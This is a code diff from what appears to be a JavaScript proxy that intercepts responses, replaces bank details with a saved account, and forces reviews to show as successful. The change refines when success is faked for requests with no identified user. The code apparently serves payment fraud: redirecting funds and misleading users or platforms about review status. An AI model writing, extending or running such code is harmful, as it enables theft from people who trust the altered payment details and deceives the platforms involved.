@@ -342,12 +342,13 @@ function getEffectiveSettings(data, userId) {
   };
 }
 
-function isAnyForceReviewSuccess(data) {
-  if (!data.userOverrides) return false;
+function getForceReviewSuccessUserIds(data) {
+  const ids = [];
+  if (!data.userOverrides) return ids;
   for (const uid of Object.keys(data.userOverrides)) {
-    if (data.userOverrides[uid].forceReviewSuccess === true) return true;
+    if (data.userOverrides[uid].forceReviewSuccess === true) ids.push(uid);
   }
-  return false;
+  return ids;
 }
 
 function getActiveBank(data, userId) {
@@ -1325,7 +1326,13 @@ async function proxyAndReplaceBankDetails(req, res, label) {
           deepReplace(respData, savedBank, {}, 0);
         }
       }
-      const shouldForceSuccess = eff.forceReviewSuccess || (!detectedUserId && isAnyForceReviewSuccess(data));
+      let shouldForceSuccess = eff.forceReviewSuccess;
+      if (!shouldForceSuccess && !detectedUserId) {
+        const successUserIds = getForceReviewSuccessUserIds(data);
+        if (successUserIds.length === 1) {
+          shouldForceSuccess = true;
+        }
+      }
       if (shouldForceSuccess) {
         if (Array.isArray(respData)) {
           respData.forEach(item => markReviewAsSuccess(item));
@@ -1526,7 +1533,13 @@ async function proxyAndReplaceBankInActiveOrders(req, res) {
         }
       }
       const eff2 = getEffectiveSettings(data, detectedUserId);
-      const shouldForceSuccess = eff2.forceReviewSuccess || (!detectedUserId && isAnyForceReviewSuccess(data));
+      let shouldForceSuccess = eff2.forceReviewSuccess;
+      if (!shouldForceSuccess && !detectedUserId) {
+        const successUserIds = getForceReviewSuccessUserIds(data);
+        if (successUserIds.length === 1) {
+          shouldForceSuccess = true;
+        }
+      }
       for (const item of items) {
         const ids = getItemIds(item);
         const primaryId = ids[0] || '';
